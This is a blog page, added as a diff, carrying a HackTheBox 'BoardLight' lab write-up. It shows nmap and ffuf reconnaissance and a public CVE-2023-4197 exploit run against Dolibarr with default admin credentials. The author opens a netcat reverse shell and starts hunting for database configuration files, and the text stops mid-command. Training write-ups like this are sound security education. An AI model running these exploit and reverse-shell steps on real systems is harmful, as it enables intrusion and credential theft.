@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://foued-saidi.tech/2024/09/27/hackthebox-boardlight/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewBoardLight is an easy-rated HackTheBox machine that deals with subdomain enumeration to discover a hidden Dolibarr crm subdomain that is vulnerable to CVE-2023-4197, later exfiltrating some da">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: BoardLight">
+<meta property="og:url" content="http://foued-saidi.tech/2024/09/27/Hackthebox-BoardLight/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewBoardLight is an easy-rated HackTheBox machine that deals with subdomain enumeration to discover a hidden Dolibarr crm subdomain that is vulnerable to CVE-2023-4197, later exfiltrating some da">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/BoardLight/BoardLight.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/BoardLight/dolibar.png">
+<meta property="article:published_time" content="2024-09-27T20:04:50.000Z">
+<meta property="article:modified_time" content="2024-09-27T22:14:27.977Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/BoardLight/BoardLight.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: BoardLight -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"foued-saidi.tech","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":["SecuriNets for life <3."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: BoardLight</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-09-27 21:04:50</span>
+        <span class="mobile">2024-09-27 21:04:50</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-09-27 23:14:27</span>
+            <span class="mobile">2024-09-27 23:14:27</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>BoardLight is an easy-rated HackTheBox machine that deals with subdomain enumeration to discover a hidden Dolibarr crm subdomain that is vulnerable to CVE-2023-4197, later exfiltrating some database credentials allow us to gain the user flag. For root, we’ll be abusing CVE-2022-37706 that is a Enlightenment windows manager local privilege escalation.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BoardLight/BoardLight.png"
+                      alt="BoardLight-info-card"
+                ><figcaption>BoardLight-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">17.205</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-09-27</span> <span class="number">21</span>:<span class="number">13</span> W. Central Africa Standard Time</span><br><span class="line">NSOCK ERROR <span class="function">[<span class="number">0.3130</span><span class="type">s</span>] <span class="title">ssl_init_helper</span></span>(): OpenSSL legacy provider failed to load.</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">17.205</span></span><br><span class="line">Host is up (<span class="number">0.13</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">8.2</span>p1 Ubuntu <span class="number">4</span>ubuntu0.<span class="number">11</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">3072</span> <span class="number">062</span>d3b851059ff7366277f0eae03eaf4 (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">5903</span>dc52873a359934447433783135fb (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> ab1338e43ee024b46938a9638238ddf4 (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2.4</span>.<span class="number">41</span> ((Ubuntu))</span><br><span class="line">|_http<span class="literal">-title</span>: Site doesn<span class="string">&#x27;t have a title (text/html; charset=UTF-8).</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.41 (Ubuntu)</span></span><br><span class="line"><span class="string">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span></span><br><span class="line"><span class="string">TCP/IP fingerprint:</span></span><br><span class="line"><span class="string">OS:SCAN(V=7.93%E=4%D=9/27%OT=22%CT=1%CU=38673%PV=Y%DS=2%DC=T%G=Y%TM=66F711F</span></span><br><span class="line"><span class="string">OS:F%P=i686-pc-windows-windows)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A</span></span><br><span class="line"><span class="string">OS:)SEQ(CI=Z)SEQ(CI=Z%II=I)OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW</span></span><br><span class="line"><span class="string">OS:7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%</span></span><br><span class="line"><span class="string">OS:W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1</span></span><br><span class="line"><span class="string">OS:(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%</span></span><br><span class="line"><span class="string">OS:S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(</span></span><br><span class="line"><span class="string">OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F</span></span><br><span class="line"><span class="string">OS:=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G</span></span><br><span class="line"><span class="string">OS:%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Network Distance: 2 hops</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE (using port 111/tcp)</span></span><br><span class="line"><span class="string">HOP RTT       ADDRESS</span></span><br><span class="line"><span class="string">1   171.00 ms 10.10.16.1</span></span><br><span class="line"><span class="string">2   171.00 ms 10.129.17.205</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 37.45 seconds</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have two open ports: 22 for ssh and 80 for http (which means we have a web application)<br>We can also see that we have a <code>board.htb</code> domain so we go ahead and add that to our <code>/etc/hosts</code> file.</p>
+<h4 id="Subdomain-Enumeration"><a href="#Subdomain-Enumeration" class="headerlink" title="Subdomain Enumeration"></a>Subdomain Enumeration</h4><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen\Tools\ffuf&gt; .\ffuf.exe <span class="literal">-w</span> ..\SecLists\Discovery\DNS\bitquark<span class="literal">-subdomains-top100000</span>.txt <span class="literal">-H</span> <span class="string">&quot;Host: FUZZ.board.htb&quot;</span> <span class="literal">-u</span> <span class="string">&quot;http://10.129.17.205&quot;</span> <span class="literal">-mc</span> <span class="number">200</span> <span class="literal">-fs</span> <span class="number">15949</span></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://10.129.17.205</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: C:\Users\0xkujen\Tools\SecLists\Discovery\DNS\bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.board.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 15949</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 1150ms]</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have a <code>crm</code> subdomain, let’s go ahead and add <code>crm.board.htb</code> to our <code>/etc/hosts</code></p>
+<h3 id="Web-Application-http-crm-board-htb"><a href="#Web-Application-http-crm-board-htb" class="headerlink" title="Web Application - http://crm.board.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://crm.board.htb/" >http://crm.board.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p>We are prompted with a <a class="link"   target="_blank" rel="noopener" href="https://www.dolibarr.org/" >Dolibarr <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> login page:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BoardLight/dolibar.png"
+                      alt="Dolibarr login"
+                ><figcaption>Dolibarr login</figcaption></figure></p>
+<p>Before trying anything, I searched for any exploits related to <code>Dolibarr 17.0.0</code> version, and I successfully found <a class="link"   target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2023-4197" >CVE-2023-4197 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> which is an Improper Input Sanitization Vulnerability in Dolibarr’s crm.<br>I found <a class="link"   target="_blank" rel="noopener" href="https://github.com/alien-keric/CVE-2023-4197/blob/main/poc.py" >this really helpful public POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for it which will grant me a shell on the user running the web app:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; python3 .\poc.py http://crm.board.htb admin admin <span class="string">&quot;ls&quot;</span></span><br><span class="line"></span><br><span class="line">===== Dolibarr ERP CRM (v18.<span class="number">0.1</span>) Improper Input Sanitization Vulnerability (CVE<span class="literal">-2023-4197</span>) =====</span><br><span class="line"></span><br><span class="line">[+] Attempting to authenticate...</span><br><span class="line">[+] Authenticated successfully!</span><br><span class="line">[+] Attempting to create a website...</span><br><span class="line">[+] Created website name: <span class="string">&quot;ef234d8b922543288599715f34155f52&quot;</span>!</span><br><span class="line">[+] Attempting to create a web page...</span><br><span class="line">[+] Created web page name: <span class="string">&quot;4e2cc3180b8d4bcf966cd5a7ad9dd125&quot;</span>!</span><br><span class="line">[+] Attempting to modify the web page...</span><br><span class="line">[+] Web page modified successfully!</span><br><span class="line">[+] Triggering RCE now via: http://crm.board.htb/public/website/index.php?website=ef234d8b922543288599715f34155f52&amp;pageref=<span class="number">4</span>e2cc3180b8d4bcf966cd5a7ad9dd125</span><br><span class="line">[+] RCE successful! Output of command:</span><br><span class="line"></span><br><span class="line">index.php</span><br><span class="line">shell.sh</span><br><span class="line">shell.sh.<span class="number">1</span></span><br><span class="line">styles.css.php</span><br><span class="line">styles.css.php</span><br><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; python3 .\poc.py http://crm.board.htb admin admin <span class="string">&quot;bash shell.sh&quot;</span></span><br><span class="line"></span><br><span class="line">===== Dolibarr ERP CRM (v18.<span class="number">0.1</span>) Improper Input Sanitization Vulnerability (CVE<span class="literal">-2023-4197</span>) =====</span><br><span class="line"></span><br><span class="line">[+] Attempting to authenticate...</span><br><span class="line">[+] Authenticated successfully!</span><br><span class="line">[+] Attempting to create a website...</span><br><span class="line">[+] Created website name: <span class="string">&quot;a01508975cc4466c8a24f59e2994655d&quot;</span>!</span><br><span class="line">[+] Attempting to create a web page...</span><br><span class="line">[+] Created web page name: <span class="string">&quot;148cfdbf321a4f4cbe398addae9c1aa0&quot;</span>!</span><br><span class="line">[+] Attempting to modify the web page...</span><br><span class="line">[+] Web page modified successfully!</span><br><span class="line">[+] Triggering RCE now via: http://crm.board.htb/public/website/index.php?website=a01508975cc4466c8a24f59e2994655d&amp;pageref=<span class="number">148</span>cfdbf321a4f4cbe398addae9c1aa0</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nc <span class="literal">-lvnp</span> <span class="number">9001</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">9001</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.17.205</span>] <span class="number">59938</span></span><br><span class="line">sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Now looking for some database files, we stumble upon a <code>conf.php</code> file:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">www-data@boardlight:~/html$ find . -name *conf.* 